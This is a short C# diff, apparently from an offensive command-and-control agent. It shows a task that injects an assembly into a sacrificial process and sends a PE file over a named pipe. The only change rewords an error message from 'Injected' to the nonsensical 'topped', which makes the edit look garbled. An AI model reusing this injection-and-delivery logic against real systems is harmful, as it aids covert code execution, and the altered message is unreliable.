@@ -239,7 +239,7 @@ namespace Tasks
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Connecting to named pipe..."));
                 if (!client.Connect(10000))
                 {
-                    throw new Exception($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
+                    throw new Exception($"topped assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Sending PE File..."));
                 IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
